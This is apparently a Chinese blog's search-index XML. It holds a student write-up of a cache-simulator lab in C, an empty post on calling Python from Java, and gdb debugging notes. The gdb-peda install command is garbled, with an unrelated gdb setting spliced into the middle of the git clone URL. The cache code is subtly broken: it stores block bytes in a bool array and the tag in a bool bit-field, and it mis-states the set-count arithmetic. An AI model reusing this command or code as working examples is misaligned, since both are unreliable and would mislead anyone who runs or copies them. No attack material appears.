<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Lab3实验总结</title>
      <link href="/2022/06/05/Lab3%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
      <url>/2022/06/05/Lab3%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>这个编程实验需要实现一个简单的cache, 并尝试实现各种替换算法来优化程序的性能. 在代码目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure><p>来编译, 生成可执行文件 <code>a.out</code> . 其运行方式如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./a.out [-r seed] [trace]</span><br></pre></td></tr></table></figure><p>其中 <code>seed</code> 是随机种子, 可以用于确定性回放帮助调试, 缺省时会用系统时间作为种子; <code>trace</code> 是 <code>bz2</code> 压缩格式的访存序列, 缺省时会产生随机访存序列来测试.</p><blockquote><p>具体见讲义：<a href="https://zhong-kangwei.gitee.io/ics-pa-gitbook-2022/lab3.html" target="_blank" rel="noopener">https://zhong-kangwei.gitee.io/ics-pa-gitbook-2022/lab3.html</a></p></blockquote><h1 id="2-实现"><a class="markdownIt-Anchor" href="#2-实现"></a> 2 实现</h1><h2 id="init_cache-20分"><a class="markdownIt-Anchor" href="#init_cache-20分"></a> init_cache （20分）</h2><ul><li><p>cache结构设计</p><ul><li><p>思路</p><p>主存<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>3</mn><mn>2</mn><mi>K</mi><mi>B</mi><mo>=</mo><msup><mn>2</mn><mrow><mn>1</mn><mn>5</mn></mrow></msup><mi>B</mi></mrow><annotation encoding="application/x-tex">32KB=2^{15}B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.8141079999999999em;"></span><span class="strut bottom" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathrm">3</span><span class="mord mathrm">2</span><span class="mord mathit" style="margin-right:0.07153em;">K</span><span class="mord mathit" style="margin-right:0.05017em;">B</span><span class="mrel">=</span><span class="mord"><span class="mord mathrm">2</span><span class="vlist"><span style="top:-0.363em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord scriptstyle uncramped"><span class="mord mathrm">1</span><span class="mord mathrm">5</span></span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mord mathit" style="margin-right:0.05017em;">B</span></span></span></span>，块<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>6</mn><mn>4</mn><mi>B</mi><mo>=</mo><msup><mn>2</mn><mn>6</mn></msup><mi>B</mi></mrow><annotation encoding="application/x-tex">64B=2^6B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.8141079999999999em;"></span><span class="strut bottom" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathrm">6</span><span class="mord mathrm">4</span><span class="mord mathit" style="margin-right:0.05017em;">B</span><span class="mrel">=</span><span class="mord"><span class="mord mathrm">2</span><span class="vlist"><span style="top:-0.363em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord mathrm">6</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mord mathit" style="margin-right:0.05017em;">B</span></span></span></span>，cache容量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mn>6</mn><mi>K</mi><mi>B</mi><mo>=</mo><msup><mn>2</mn><mrow><mn>1</mn><mn>4</mn></mrow></msup><mi>B</mi></mrow><annotation encoding="application/x-tex">16KB=2^{14}B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.8141079999999999em;"></span><span class="strut bottom" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathrm">1</span><span class="mord mathrm">6</span><span class="mord mathit" style="margin-right:0.07153em;">K</span><span class="mord mathit" style="margin-right:0.05017em;">B</span><span class="mrel">=</span><span class="mord"><span class="mord mathrm">2</span><span class="vlist"><span style="top:-0.363em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord scriptstyle uncramped"><span class="mord mathrm">1</span><span class="mord mathrm">4</span></span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mord mathit" style="margin-right:0.05017em;">B</span></span></span></span>，行数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mn>6</mn><mi>K</mi><mi>B</mi><mi mathvariant="normal">/</mi><mn>6</mn><mn>4</mn><mi>B</mi><mo>=</mo><msup><mn>2</mn><mn>8</mn></msup><mi>B</mi></mrow><annotation encoding="application/x-tex">16KB/64B=2^8B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.8141079999999999em;"></span><span class="strut bottom" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathrm">1</span><span class="mord mathrm">6</span><span class="mord mathit" style="margin-right:0.07153em;">K</span><span class="mord mathit" style="margin-right:0.05017em;">B</span><span class="mord mathrm">/</span><span class="mord mathrm">6</span><span class="mord mathrm">4</span><span class="mord mathit" style="margin-right:0.05017em;">B</span><span class="mrel">=</span><span class="mord"><span class="mord mathrm">2</span><span class="vlist"><span style="top:-0.363em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord mathrm">8</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mord mathit" style="margin-right:0.05017em;">B</span></span></span></span>；由于四路组相联，所以cache组号占<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>8</mn></msup><mi>B</mi><mi mathvariant="normal">/</mi><mn>4</mn><mo>=</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">2^8B/4=6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.8141079999999999em;"></span><span class="strut bottom" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord"><span class="mord mathrm">2</span><span class="vlist"><span style="top:-0.363em;margin-right:0.05em;"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span><span class="reset-textstyle scriptstyle uncramped"><span class="mord mathrm">8</span></span></span><span class="baseline-fix"><span class="fontsize-ensurer reset-size5 size5"><span style="font-size:0em;">​</span></span>​</span></span></span><span class="mord mathit" style="margin-right:0.05017em;">B</span><span class="mord mathrm">/</span><span class="mord mathrm">4</span><span class="mrel">=</span><span class="mord mathrm">6</span></span></span></span>位，所以Tag占<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mn>5</mn><mo>−</mo><mn>6</mn><mo>−</mo><mn>6</mn><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">15-6-6=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.64444em;"></span><span class="strut bottom" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="base textstyle uncramped"><span class="mord mathrm">1</span><span class="mord mathrm">5</span><span class="mbin">−</span><span class="mord mathrm">6</span><span class="mbin">−</span><span class="mord mathrm">6</span><span class="mrel">=</span><span class="mord mathrm">3</span></span></span></span>位。</p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">bool</span> valid_bit:<span class="number">1</span>;<span class="comment">//valid bit</span></span><br><span class="line"><span class="keyword">bool</span> tag:<span class="number">3</span>;<span class="comment">//Tag</span></span><br><span class="line"><span class="keyword">bool</span> data[<span class="number">64</span>];<span class="comment">//block: data</span></span><br><span class="line"><span class="keyword">bool</span> dirty_bit:<span class="number">1</span>;<span class="comment">//dirty bit</span></span><br><span class="line">&#125;Cache;</span><br><span class="line"></span><br><span class="line">Cache *cache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>cache初始化</p><ul><li><p>思路<br>算出总行数，然后遍历cache并将所有valid bit置为无效即可。</p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cache</span><span class="params">(<span class="keyword">int</span> total_size_width, <span class="keyword">int</span> associativity_width)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> lines = exp2( total_size_width - BLOCK_WIDTH );<span class="comment">//number of lines??</span></span><br><span class="line"><span class="comment">//printf("%d\n", lines);</span></span><br><span class="line">cache = <span class="built_in">malloc</span>( lines * <span class="keyword">sizeof</span>(Cache) );<span class="comment">//init a cache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Set all valid bits as invalid</span></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i=<span class="number">0</span>; i &lt; lines; i++ )&#123;</span><br><span class="line">cache[i].valid_bit = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="cache_read-30分"><a class="markdownIt-Anchor" href="#cache_read-30分"></a> cache_read (30分)</h2><ul><li><p>思路：首先将主存地址进行划分，然后分情况讨论：</p><ul><li>命中成功，在相关cache组中找到符合条件(tag位相同且有效位有效)的cache行，则直接从cache中读出；</li><li>命中失败，但在该组中有空闲行，则到主存读取一块信息并设置标记位；</li><li>命中失败且在该组中未找到空闲行，则任意替代该组的某一行并设置cache。</li></ul></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get data from cache</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">get_data</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">int</span> offset)</span></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> ret = cache[num].data[offset] + </span><br><span class="line">(cache[num].data[offset + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + </span><br><span class="line">(cache[num].data[offset + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) + </span><br><span class="line">(cache[num].data[offset + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">cache_read</span><span class="params">(<span class="keyword">uintptr_t</span> addr)</span> </span>&#123;</span><br><span class="line">try_increase(<span class="number">1</span>);<span class="comment">//visit cache times ++</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Memory address division</span></span><br><span class="line">addr = addr &amp; <span class="number">0x7FFF</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> tag, cache_group_num, block_offset, block_num;</span><br><span class="line">block_offset = addr &amp; <span class="number">0x3C</span>;<span class="comment">//block addr: 6 bits, 4 bytes alignment</span></span><br><span class="line">cache_group_num = (addr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>;<span class="comment">//cache group number: 6 bits</span></span><br><span class="line">tag = (addr &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x7</span>;<span class="comment">//tag: 3 bits</span></span><br><span class="line">block_num = (tag &lt;&lt; <span class="number">6</span>) | cache_group_num;<span class="comment">//memory block number</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> paddr, ret_data;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;<span class="comment">//flag hit or not</span></span><br><span class="line"><span class="keyword">int</span> start = cache_group_num * <span class="number">4</span>;<span class="comment">//the start of a group</span></span><br><span class="line"><span class="keyword">int</span><span class="built_in">end</span>   = start + <span class="number">3</span>;          <span class="comment">//the end of a group</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Find the corresponding group</span></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = start ; i &lt;= <span class="built_in">end</span> ; i++ )&#123;</span><br><span class="line"><span class="comment">//Successful hit</span></span><br><span class="line"><span class="keyword">if</span>( cache[i].tag == tag &amp;&amp; cache[i].valid_bit )&#123;</span><br><span class="line">hit_increase(<span class="number">1</span>);</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">ret_data = get_data(i, block_offset);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//failed hit</span></span><br><span class="line"><span class="keyword">if</span>( !flag )&#123;</span><br><span class="line"><span class="keyword">bool</span> flg = <span class="literal">false</span>;<span class="comment">// flag that is there a free line</span></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = start ; i &lt;= <span class="built_in">end</span>; i++ )&#123;</span><br><span class="line"><span class="comment">//find a free line</span></span><br><span class="line"><span class="keyword">if</span>( !cache[i].valid_bit  )&#123;</span><br><span class="line">flg = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//set cache</span></span><br><span class="line">mem_read(block_num, cache[i].data);<span class="comment">//read data from memory</span></span><br><span class="line">cache[i].tag = tag;</span><br><span class="line">cache[i].valid_bit = <span class="literal">true</span>;</span><br><span class="line">cache[i].dirty_bit = <span class="literal">false</span>;</span><br><span class="line">ret_data = get_data(i, block_offset); </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cannot find a free line, </span></span><br><span class="line"><span class="keyword">if</span>( !flg )&#123;</span><br><span class="line"><span class="keyword">int</span> rand_line = start + rand()%<span class="number">4</span>;<span class="comment">//find a random line</span></span><br><span class="line"><span class="comment">//if dirty, write first</span></span><br><span class="line"><span class="keyword">if</span>( cache[rand_line].dirty_bit )&#123;</span><br><span class="line">paddr = ( cache[rand_line].tag &lt;&lt; <span class="number">6</span> ) | cache_group_num ;</span><br><span class="line">mem_write(paddr, cache[rand_line].data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//set cache</span></span><br><span class="line">mem_read(block_num, cache[rand_line].data);</span><br><span class="line">cache[rand_line].tag = tag;</span><br><span class="line">cache[rand_line].valid_bit = <span class="literal">true</span>;</span><br><span class="line">cache[rand_line].dirty_bit = <span class="literal">false</span>;</span><br><span class="line">ret_data = get_data(rand_line, block_offset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret_data;</span><br><span class="line"></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="cache_write-30分"><a class="markdownIt-Anchor" href="#cache_write-30分"></a> cache_write (30分)</h2><ul><li><p>思路：首先将主存地址进行划分，然后分情况讨论(与读类似)：</p><ul><li>命中成功，在相关cache组中找到符合条件(tag位相同且有效位有效)的cache行，则根据写掩码写入cache并置脏位；</li><li>命中失败，但在该组中有空闲行，则根据写掩码写入cache并设置标记位；</li><li>命中失败且在该组中未找到空闲行，则随机取一行；判断脏位是否为1，若为1则将当前的cache行写回主存，然后根据写掩码写入cache并设置cache。</li></ul></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//set the data of cache by wmask</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cache</span><span class="params">(<span class="keyword">int</span> num , <span class="keyword">uint32_t</span> offset , <span class="keyword">uint32_t</span> wmask , <span class="keyword">uint32_t</span> data)</span></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> standard_data;</span><br><span class="line">standard_data = get_data(num, offset); </span><br><span class="line">standard_data = ( standard_data &amp; ( ~ wmask) ) | (data &amp; wmask);</span><br><span class="line"></span><br><span class="line">cache[num].data[offset]     = standard_data         &amp; <span class="number">0xFF</span>;</span><br><span class="line">cache[num].data[offset + <span class="number">1</span>] = (standard_data &gt;&gt;  <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">cache[num].data[offset + <span class="number">2</span>] = (standard_data &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">cache[num].data[offset + <span class="number">3</span>] = (standard_data &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cache_write</span><span class="params">(<span class="keyword">uintptr_t</span> addr, <span class="keyword">uint32_t</span> data, <span class="keyword">uint32_t</span> wmask)</span> </span>&#123;</span><br><span class="line">try_increase(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//Memory address division</span></span><br><span class="line">addr = addr &amp; <span class="number">0x7FFF</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> tag, cache_group_num, block_offset, block_num;</span><br><span class="line">block_offset = addr &amp; <span class="number">0x3C</span>;</span><br><span class="line">cache_group_num = (addr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">tag = (addr &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">    block_num = (tag &lt;&lt; <span class="number">6</span>) | cache_group_num;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> paddr;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;<span class="comment">// flag write hit or not</span></span><br><span class="line"><span class="keyword">int</span> start = cache_group_num * <span class="number">4</span>;<span class="comment">//the start of a group</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">end</span>   = start + <span class="number">3</span>;<span class="comment">//the end of a group</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Find the corresponding group</span></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = start ; i &lt;= <span class="built_in">end</span>; i++ )&#123;</span><br><span class="line"><span class="comment">//successful hit</span></span><br><span class="line"><span class="keyword">if</span>( cache[i].tag == tag &amp;&amp; cache[i].valid_bit )&#123;</span><br><span class="line">hit_increase(<span class="number">1</span>);</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line">set_cache(i, block_offset, wmask, data);<span class="comment">//write data</span></span><br><span class="line">cache[i].dirty_bit = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//failed hit</span></span><br><span class="line"><span class="keyword">if</span>( !flag )&#123;</span><br><span class="line"><span class="keyword">bool</span> flg = <span class="literal">false</span>;<span class="comment">//flag that is there a free line</span></span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = start ; i &lt;= <span class="built_in">end</span>; i++ )&#123;</span><br><span class="line"><span class="comment">//find a free line</span></span><br><span class="line"><span class="keyword">if</span>( !cache[i].valid_bit )&#123;</span><br><span class="line">flg = <span class="literal">true</span>;</span><br><span class="line">mem_read(block_num, cache[i].data);<span class="comment">//read data from memory</span></span><br><span class="line">set_cache(i, block_offset, wmask, data);<span class="comment">//write data to cache</span></span><br><span class="line">cache[i].tag = tag;</span><br><span class="line">cache[i].valid_bit = <span class="literal">true</span>;</span><br><span class="line">cache[i].dirty_bit = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cannot find a free line</span></span><br><span class="line"><span class="keyword">if</span>( !flg )&#123;</span><br><span class="line"><span class="keyword">int</span> rand_line = start + rand()%<span class="number">4</span>;<span class="comment">//find a random line</span></span><br><span class="line"><span class="comment">//if dirty, write first</span></span><br><span class="line"><span class="keyword">if</span>( cache[rand_line].dirty_bit )&#123;</span><br><span class="line">paddr = ( cache[rand_line].tag &lt;&lt; <span class="number">6</span> ) | cache_group_num;</span><br><span class="line">mem_write(paddr, cache[rand_line].data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//set cache</span></span><br><span class="line">mem_read(block_num, cache[rand_line].data);</span><br><span class="line">set_cache(rand_line, block_offset, wmask , data);</span><br><span class="line">cache[rand_line].tag = tag;</span><br><span class="line">cache[rand_line].valid_bit = <span class="literal">true</span>;</span><br><span class="line">cache[rand_line].dirty_bit = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="最终结果截图20分"><a class="markdownIt-Anchor" href="#最终结果截图20分"></a> 最终结果截图（20分）</h2><img src="https://s2.loli.net/2022/06/05/TkSoKYvaZm7dDq1.jpg" width="800" height="200" alt="图片名称" align="center" id="206"><h2 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h2><ul><li><strong>问</strong>：数据对齐和存储层次结构：想一想, 为什么编译器为变量分配存储空间的时候一般都会对齐? 访问一个没有对齐的存储空间会经历怎么样的过程?</li><li><strong>答</strong>：需要字节对齐的根本原因在于CPU访问数据的效率问题。若存储空间未对齐，则可能出现多次访存，然后组合成目标数据，因此带来指令执行效率的降低。</li><li><strong>参考</strong>：<ul><li><a href="https://blog.csdn.net/hunanchenxingyu/article/details/53942407" target="_blank" rel="noopener">为什么需要字节对齐</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计组 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java中调用Python程序</title>
      <link href="/2022/05/29/Java%E4%B8%AD%E8%B0%83%E7%94%A8Python%E7%A8%8B%E5%BA%8F/"/>
      <url>/2022/05/29/Java%E4%B8%AD%E8%B0%83%E7%94%A8Python%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gdb调试</title>
      <link href="/2022/05/27/gdb%E8%B0%83%E8%AF%95/"/>
      <url>/2022/05/27/gdb%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-前言"><a class="markdownIt-Anchor" href="#1-前言"></a> 1 前言</h1><p>gdb调试是必须要掌握的基本技能。</p><h1 id="2-安装gdb-peda"><a class="markdownIt-Anchor" href="#2-安装gdb-peda"></a> 2 安装gdb-peda</h1><p>gdb-peda是gdb的插件，加强gdb调试能力。</p><p>安装方法如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ <span class="built_in">set</span> disassembly-flavor att$ git <span class="built_in">clone</span> htgdb-peda$ <span class="built_in">set</span> disassembly-flavor atttps://github.com/longld/peda.git ~/peda</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>安装插件后汇编指令格式改为了intel模式，不太习惯，改变为AT&amp;T格式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 改为AT&amp;T格式</span></span><br><span class="line">gdb-peda$ <span class="built_in">set</span> disassembly-flavor att</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改为Intel格式</span></span><br><span class="line">gdb-peda$ <span class="built_in">set</span> disassembly-flavor intel</span><br></pre></td></tr></table></figure><p><strong>参考</strong>：<a href="https://blog.csdn.net/counsellor/article/details/81290335" target="_blank" rel="noopener">gdb-peda安装</a></p><p>此外，GDB dashboard插件也不错：<a href="https://github.com/cyrus-and/gdb-dashboard" target="_blank" rel="noopener">链接</a></p><h1 id="3-文档"><a class="markdownIt-Anchor" href="#3-文档"></a> 3 文档</h1><ul><li><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html" target="_blank" rel="noopener">《100个gdb小技巧》</a></li><li><a href="https://sourceware.org/gdb/current/onlinedocs/gdb/" target="_blank" rel="noopener">gdb手册</a></li></ul><h1 id="4-gdb卡片"><a class="markdownIt-Anchor" href="#4-gdb卡片"></a> 4 GDB卡片</h1><img src="https://s2.loli.net/2022/05/27/joJaNUkKdB5Pnew.png" width="1000" height="800" alt="图片名称" align="center" id="204"><img src="https://s2.loli.net/2022/05/27/yrgOVkfGmJQxjDT.png" width="1000" height="800" alt="图片名称" align="center" id="205"><h1 id="5-常见指令"><a class="markdownIt-Anchor" href="#5-常见指令"></a> 5 常见指令</h1><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://blog.csdn.net/tianya_lu/article/details/123648314" target="_blank" rel="noopener">gdb基本命令(非常详细)</a></li><li><a href="https://www.cnblogs.com/qq78292959/archive/2012/07/20/2600865.html" target="_blank" rel="noopener">EAX、ECX、EDX、EBX寄存器的作用</a></li><li><a 